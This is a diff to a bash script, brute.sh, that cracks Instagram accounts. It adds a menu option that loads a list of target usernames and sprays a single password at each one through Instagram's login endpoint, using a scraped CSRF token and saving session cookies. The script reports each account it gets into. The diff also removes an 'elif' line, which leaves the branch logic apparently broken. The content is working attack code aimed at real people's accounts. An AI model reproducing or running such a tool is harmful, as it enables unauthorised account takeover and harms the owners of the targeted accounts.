@@ -38,6 +38,7 @@ done
 echo -e '''
 1]. Get target from specific \e[1;31m@username\e[1;37m
 2]. Get target from specific \e[1;31m#hashtag\e[1;37m
+3]. Crack from your target list
 '''
 
 read -p $'What do you want   : \e[1;33m' opt
@@ -71,9 +72,21 @@ case $opt in
             rm hashtag result
         fi
         ;;
+    3) #menu 3
+        read -p $'\e[37m[\e[34m?\e[37m] Input your list   : \e[1;33m' list
+        if [[ ! -e $list ]]; then
+            echo -e "${red}file not found${white}"
+            exit
+            else
+                cat $list > target
+                echo -e "[${blue}+${white}] Total your list   : ${yellow}"$(< target wc -l)
+                read -p $'[\e[34m?\e[37m] Password to use   : \e[1;33m' pass
+                echo -e "${white}[${yellow}!${white}] ${red}Start cracking...${white}"
+        fi
+        ;;
     *) #wrong menu
         echo -e "${white}options are not on the menu"
-        sleep 2
+        sleep 1
         clear
         bash brute.sh
 esac
@@ -81,7 +94,7 @@ esac
 #start_brute
 token=$(curl -sLi "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
 function brute(){
-    url=$(curl -s -X POST "https://www.instagram.com/accounts/login/ajax/" \
+    url=$(curl -s -c cookie.txt -X POST "https://www.instagram.com/accounts/login/ajax/" \
                     -H "cookie: csrftoken=${token}" \
                     -H "origin: https://www.instagram.com" \
                     -H "referer: https://www.instagram.com/accounts/login/" \
@@ -92,7 +105,6 @@ function brute(){
                     login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
                     if [[ $login =~ "true" ]]; then
                             echo -e "[${green}+${white}] ${yellow}get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
-                        elif [[ $login =~ "false" ]]; then
                                     echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
                             elif [[ $url =~ "checkpoint_required" ]]; then
                                     echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
